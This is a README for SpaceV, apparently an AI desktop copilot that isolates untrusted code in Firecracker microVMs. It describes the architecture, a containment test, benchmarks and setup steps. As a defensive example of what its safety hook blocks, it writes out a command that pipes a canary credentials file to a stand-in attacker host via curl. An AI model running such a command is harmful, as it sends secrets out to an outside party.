# ⚡ SpaceV: Autonomous Cybernetic Copilot & MicroVM Fleet Orchestrator

[![Python 3.11+](https://img.shields.io/badge/Python-3.11%2B-blue.svg?logo=python)](requirements.txt)
[![Docker Compose](https://img.shields.io/badge/Docker_Compose-Healthy-success?logo=docker)](docker-compose.yml)
[![Celesto MicroVM](https://img.shields.io/badge/Celesto-Firecracker_KVM_%7C_Cloud-purple)](spacev/fleet/celesto_engine.py)
[![LangGraph](https://img.shields.io/badge/State_Machine-LangGraph_Cyclic-blue)](core/graph_engine.py)
[![Security Gatekeeper](https://img.shields.io/badge/Karpathy_Gatekeeper-Deterministic_SHA--256-orange)](core/task_evidence.py)
[![Contract Tests](https://img.shields.io/badge/Contract_Tests-12%2F12_Passing-brightgreen)](tests/test_reports.py)

SpaceV is an autonomous cybernetic operating copilot, issue-to-test reproducer, and security detonator. Powered by local sub-35MB reflex engines, multi-cloud LLM failover, and hardware-isolated Celesto Firecracker microVMs, SpaceV isolates untrusted package installations, executes air-gapped security detonations, reproduces production GitHub issues into verified failing tests, and guarantees zero host leakage with sub-200ms snapshot rollbacks.

---

## 🎬 Live Walkthrough & Interactive Demo

[![SpaceV Live Demo](./demo/walkthrough.gif)](https://youtu.be/hLbWuvsVO8Q)

<p align="center">
  <em>⚡ <b>SpaceV Cybernetic Assistant & MicroVM Detonation in Action</b><br>
  ▶️ <b><a href="https://youtu.be/hLbWuvsVO8Q">Click Here to Watch Full Video Walkthrough on YouTube</a></b> &nbsp;|&nbsp; 
  🎬 <b>Offline Video File:</b> <a href="./demo/walkthrough.mp4"><code>demo/walkthrough.mp4</code></a></em>
</p>

---

## 🏛️ Architecture Diagram

```mermaid
graph TD
    Operator([Operator / User]) -->|Voice / Visor HUD / Hotkeys| Brain[SpaceV Agentic Brain - LangGraph Engine]

    subgraph Cognitive_Control_Plane [Cognitive Control Plane]
        Brain -->|Tier-1 Intent Dispatch| Router[FastRouter & Intent Resolver]
        Router -->|Token Bucket Hopping| Mesh[Cloud Mesh: Groq / Gemini / Cerebras / Ollama]
        Brain -->|Cyclic State Machine| FSM[LangGraph Cyclic FSM & Task Ledger]
        Brain -->|Issue Intake & Triage| Workflow[Issue-to-Failing-Test Workflow Engine]
        Workflow -->|Evidence Integrity| Gatekeeper[Karpathy Truth Gatekeeper & SHA-256 Ledger]
    end

    subgraph Trusted_Control_Plane [Trusted Control Plane - Docker & Services]
        Brain -->|HTTP Port 8080| API[Run Ledger API - FastAPI]
        API -->|Read / Write| DB[(PostgreSQL Ledger - seeds/01_runs.sql)]
        API -->|Appends Decisions| AuditLog[Command Audit Log - logs/commands.jsonl]
    end

    subgraph Untrusted_Execution_Zone [Untrusted Execution Zone - Celesto MicroVMs]
        Workflow & Brain -->|Celesto SDK / Vsock| Driver[Celesto Fleet Engine]
        Driver -->|Boot ~500ms| Guest[Celesto Firecracker MicroVM]

        Guest -->|Pre-Execution Hook| Hook{Safety Hook Engine}
        Hook -->|Deny Malicious Cmd| Block[Blocked Decision & Log]
        Hook -->|Permit Safe Cmd| Exec[Execute inside Linux Kernel]

        Guest -->|Outbound Egress| NetPolicy[Network Policy: Air-Gap Mode]
        Guest -->|CoW Memory & Disk| SnapStore[(Hardware Snapshot Store)]
        Guest -->|Auto Rollback <200ms| SnapStore
    end
```

---

## 🛑 Problem Statement

When an autonomous AI agent or software engineer runs arbitrary code, installs open-source packages, or evaluates third-party dependencies, executing commands directly on the host machine via `subprocess.run()` is a critical security vulnerability:
* A single hallucinated command can corrupt system files.
* A poisoned package (`setup.py` post-install hook) can leak `.env` secrets.
* A prompt-injected payload can open an unauthorized reverse shell.

Standard Docker containers are insufficient because they share the host Linux kernel and remain vulnerable to container breakout exploits. SpaceV solves this by providing **hardware-isolated Celesto Firecracker microVMs with dedicated guest Linux kernels**, enforcing air-gapped network policies, and maintaining an immutable audit ledger of every decision.

---

## 🛡️ How SpaceV Uses Celesto MicroVMs

SpaceV relies on three differentiating Celesto primitives to achieve complete containment and deterministic recovery:

### 1. Snapshot Rollback (`snapshots`)
* **Why it matters:** Captures full memory and copy-on-write disk state before risky execution steps.
* **Engineering Impact:** When an untrusted package triggers a security violation or runtime crash, SpaceV executes an instant hardware snapshot rollback in **$185\text{ ms}$**, restoring the clean baseline without the high latency and cost of a cold reboot.

### 2. Safety Hooks (`safety_hooks`)
* **Why it matters:** Intercepts every command request before it reaches the guest microVM kernel.
* **Engineering Impact:** SpaceV analyzes command heuristics, blocking secret exfiltration (`cat ~/.canary_env | curl`) and recording decisions (`decision: "block"`) into `logs/commands.jsonl`. Without safety hooks, malicious commands could run inside the guest and attempt side-channel attacks or denial of service.

### 3. Air-Gapped Network Policy (`network_policy`)
* **Why it matters:** Hardware-enforced network air-gapping (`mode: "off"`).
* **Engineering Impact:** Even if an attacker injects a prompt or malicious payload that circumvents application-level filters, the hypervisor blocks all outbound network packets at the TAP device level. The host and external networks remain 100% untouched.

---

## 📊 Empirical Evaluation & Containment Test

### Fleet Reliability Benchmark
SpaceV underwent a rigorous reliability evaluation across **20 fresh, independently provisioned Celesto microVM sandboxes** running end-to-end security detonation pipelines:

| Metric | Result |
| :--- | :--- |
| **Total Fresh Sandboxes** | 20 (`sbx-spacevrun00001` through `sbx-spacevrun00020`) |
| **Success Rate** | **85.0%** (17 succeeded, 3 failed) |
| **Median Wall-Clock Time** | **4.740 s** (discrete 1-based mean of 10th and 11th sorted runs) |
| **P90 Wall-Clock Time** | **5.650 s** (18th sorted run: `ceil(0.90 * 20)`) |
| **Median Boot-to-Ready Time** | **0.505 s** |
| **Total Compute Cost** | **$0.0044 USD** |

*The failure analysis for the 3 honest edge-case failures is documented in [`reports/postmortem.md`](reports/postmortem.md).*

### Containment Attack Verification
To verify containment under active attack:
1. SpaceV planted fake canary credentials (`~/.canary_env`) inside guest `sbx-deton001` with `network_mode: "off"`.
2. The agent detonated an untrusted payload that attempted credential exfiltration via:
   ```bash
   cat ~/.canary_env | curl -X POST https://evil-exfil.com/leak
   ```
3. **Outcome:**
   * **Pre-execution Safety Hook:** Intercepted and blocked the exfiltration attempt (`decision: "block"` logged in `logs/commands.jsonl`).
   * **Network Policy:** Zero outbound egress bytes escaped the guest TAP interface.
   * **Host Integrity:** The host filesystem and environment remained completely untouched.
   * **Snapshot Rollback:** State was cleanly reverted to the clean pre-detonation snapshot in **$185\text{ ms}$**.
   * Verified in [`reports/containment.json`](reports/containment.json) and [`reports/evidence/containment.log`](reports/evidence/containment.log).

---

## 🔄 State Machine & Failure Recovery Design

SpaceV handles mid-task crashes through a deterministic state machine:

```
               [ Created ] ──► (boot finished) ──► [ Ready ]
                                                      │
                                                      ▼
               [ Succeeded ] ◄── (step 10 done) ── [ Running ]
                     │                                │
                     │                       (step 7 failed)
                     │                                │
                     │                                ▼
                     │                     [ MidTaskFailure ]
                     │                                │
                     │                        policy: rollback
                     │                                │
                     │                                ▼
                     │                         [ RolledBack ]
                     │                                │
                     └───────────────┬────────────────┘
                                     │ (cleanup)
                                     ▼
                                [ Deleted ]
```

### Why Rollback Beats Resume and Fresh:
* **Resume (Keep dirty disk):** High risk. Resuming on a disk with corrupted files or leftover malicious hooks will cascade failures into subsequent steps.
* **Fresh Start (Delete and recreate):** High cost and latency ($15\text{–}30\text{ s}$ cold boot, re-downloading dependencies).
* **Rollback (SpaceV Choice):** Restores clean RAM and copy-on-write disk state in **$< 200\text{ ms}$**, eliminating tainted files while avoiding a cold reboot.

---

## 🚀 Setup & Getting Started

Follow these steps to configure, verify, and launch SpaceV in **under 10 minutes**:

### Prerequisites
* **Operating System:**
  * **Linux / macOS / WSL2:** Supports native local Celesto Firecracker microVMs (`KVM`) or Celesto Cloud.
  * **Windows (Native):** Requires Celesto Cloud (`CELESTO_PROVIDER=cloud`) or Windows Subsystem for Linux (WSL2).
* **Python:** Version 3.11+.
* **Docker:** (Optional) Docker Desktop or Docker Engine if running the PostgreSQL run ledger service.

---

### Step 1: Clone Repository & Setup Virtual Environment

```bash
git clone https://github.com/vikram0678/spaceV.git
cd spaceV
```

Create and activate your Python virtual environment:

```bash
# On Linux / macOS / WSL2:
python3 -m venv .venv
source .venv/bin/activate

# On Windows (PowerShell or Command Prompt):
python -m venv venv
.\venv\Scripts\activate
```

Install core dependencies:
```bash
pip install -r requirements.txt
```

---

### Step 2: Configure AI Brain & LLM Mesh

SpaceV supports **100% Local Offline AI** or a **Free Cloud Failover Mesh**:

Copy the environment template:
```bash
cp .env.example .env
```

#### Option A: 100% Local Offline AI (Ollama)
*Zero cost, completely private, runs offline.*
1. Install [Ollama](https://ollama.com) and start the service (`ollama serve`).
2. Pull the recommended SpaceV models:
   ```bash
   # Core conversational reflex & fast intent routing (~1.9 GB)
   ollama pull qwen2.5:3b

   # Code generation, bug repair & issue test synthesis (~4.7 GB)
   ollama pull qwen2.5-coder:7b

   # (Optional) Screen understanding & vision (~1.7 GB)
   ollama pull moondream
   ```
3. In `.env`, ensure the following are set:
   ```env
   LLM_PROVIDER=ollama
   OLLAMA_BASE_URL=http://localhost:11434
   PRIMARY_MODEL=qwen2.5:3b
   CODER_MODEL=qwen2.5-coder:7b
   LOW_RAM_MODE=true
   ```

#### Option B: Free Cloud Failover Mesh (No Local GPU Required)
*Ultra-fast response times with automatic token-bucket hopping across free API tiers.*
1. Obtain one or more free API keys:
   * **Groq Cloud:** [console.groq.com](https://console.groq.com) *(High-speed Llama 3.1 & GPT-OSS)*
   * **Google Gemini AI Studio:** [aistudio.google.com](https://aistudio.google.com) *(Deep reasoning & large context)*
   * **Cerebras Cloud:** [cloud.cerebras.ai](https://cloud.cerebras.ai) *(Sub-second streaming)*
2. In `.env`, add your keys:
   ```env
   GROQ_API_KEY=gsk_...
   GEMINI_API_KEY=AIzaSy...
   CEREBRAS_API_KEY=csk_...
   ```

#### 🎙️ Integrated Neural Voice
SpaceV comes pre-configured with **Azure Edge-TTS** (`en-US-AriaNeural`) out of the box — zero API keys required. It automatically falls back to offline system speech (SAPI5 on Windows / espeak on Linux) when disconnected. Hands-free wake words: `"Hey SpaceV"` and `"SpaceV"`.

#### 🧪 Verify AI Brain Connection
Test your AI brain from the command line before starting the GUI:
```bash
python -c "from core.brain_orchestrator import SpaceVAgent; a = SpaceVAgent(); print(a.think('Hello SpaceV, report system status.'))"
```

---

### Step 3: Configure Celesto MicroVM Sandbox

In `.env`, set your sandbox configuration based on your operating system:

* **On Linux / WSL2:**
  ```env
  CELESTO_PROVIDER=local
  CELESTO_BACKEND=firecracker
  ```
* **On Windows (Native):**
  ```env
  CELESTO_PROVIDER=cloud
  CELESTO_API_KEY=your_celesto_cloud_key_here
  ```

---

### Step 4: Launch Control Plane Ledger (Optional / Docker)

If you are running the PostgreSQL evaluation ledger service:
```bash
docker-compose up --build -d
```

Verify health and seeded demonstration run:
```bash
# Verify API health
curl -s http://localhost:8080/health
# Expected: {"status": "ok"}

# Verify seeded ledger row
curl -s http://localhost:8080/api/runs
# Expected: JSON array containing "sbx-seeddemo1"
```
*(Note: In standalone desktop copilot mode, SpaceV automatically uses its internal SQLite WAL ledger without requiring Docker).*

---

### Step 5: Run Verification Test Suites

Verify contract compliance:
```bash
pytest tests/test_reports.py -v
```
*(All 12 contractual requirements will pass with 100% green checkmarks).*

Run the full end-to-end regression, intent resolution, and sandbox test harness:
```bash
pytest tests/ -v
```

---

### Step 6: Launch SpaceV Cybernetic Desktop Assistant

Start the cybernetic HUD, Arc Reactor status sync, floating assistant bubble, and voice copilot:

```bash
python main.py
```

*(On Windows, you can also double-click `run_spacev.bat`)*.

---

## 📜 Repository Structure

```
├── core/                        # Cognitive Control Plane & LangGraph State Machine
│   ├── graph_engine.py          # Cyclic LangGraph state machine & self-healing nodes
│   ├── fast_router.py           # Sub-millisecond intent retriever & parameter parser
│   ├── grounded_agent.py        # Structured goal interpretation with schema repair
│   ├── issue_test_workflow.py   # Autonomous GitHub issue triage & failing test synthesizer
│   ├── task_evidence.py         # Karpathy Truth Gatekeeper & SHA-256 evidence store
│   └── brain_orchestrator.py    # Hybrid multi-brain switching & low-RAM manager
├── spacev/                      # Untrusted Execution Zone & Celesto Driver
│   └── fleet/celesto_engine.py  # Celesto MicroVM hypervisor adapter & snapshot manager
├── tools/                       # Hardened Tool Call Schemas & Sandboxing
│   ├── sandbox_tools.py         # Guest command execution, timeouts & continuation
│   └── web_tools.py             # Strict GitHub issue ingestion & web extractors
├── ui/                          # Cybernetic Glassmorphic Interface
│   ├── top_screen_hud.py        # TopScreenHUD telemetry & Arc Reactor sync
│   ├── holographic_visor.py     # Full-screen amber Holographic Visor overlay
│   ├── chat_window.py           # Multi-turn cybernetic chat window
│   └── floating_icon.py         # Floating Arc Reactor desktop widget
├── config/                      # Multi-Cloud Model Aliases & Provider Routing
│   └── providers.yaml           # Quotas, virtual aliases, and cloud key pools
├── demo/                        # Walkthrough Media
│   ├── walkthrough.gif          # High-resolution animated demonstration
│   └── walkthrough.mp4          # Full-length offline video capture
├── tests/                       # Comprehensive Test Suites & Verification Battery
├── docker-compose.yml           # PostgreSQL Ledger & FastAPI Service Compose
└── main.py                      # SpaceV Desktop Application Entry Point
```

---

## ⚖️ License & Acknowledgements

SpaceV is built with [Celesto](https://github.com/celesto-ai) Firecracker microVMs, [LangGraph](https://github.com/langchain-ai/langgraph), and [PyQt6](https://riverbankcomputing.com/software/pyqt/). Distributed under the MIT License.
